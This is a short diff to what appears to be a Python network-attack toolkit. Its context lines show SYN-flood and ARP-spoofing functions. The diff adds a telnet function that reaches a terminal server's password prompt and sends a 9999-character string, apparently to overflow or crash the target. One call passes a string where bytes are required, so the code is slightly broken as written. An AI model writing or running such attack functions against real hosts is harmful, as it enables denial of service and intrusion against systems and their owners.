@@ -5,6 +5,7 @@ import time
 from ftplib import FTP
 from threading import Thread
 import socket
+import telnetlib
 
 # sends SYN packet to inputted address and port but does not send ACK packet back to HOSt
 def syn_flood(src, dst, dport):
@@ -285,4 +286,18 @@ def ARPSpoof(src, dst, dport):
     except KeyboardInterrupt:
         restore(gateway_ip, dst)
         restore(dst, gateway_ip)
+
+def telnet_long(src, dst, dport):
+    tn = telnetlib.Telnet(dst)
+    tn.read_until(b"TERMINAL SERVER")
+    tn.write(b"\n")
+    tn.read_until(b"=")
+    tn.write(b"acc")
+    tn.read_until("Password: ? ")
+    user = "X"*9999
+    tn.write(user.encode('ascii')+b"\n")
+    tn.write(b"\n")
+    tn.write(b"exit\n")
+    print(tn.read_all().decode('ascii'))
+
 
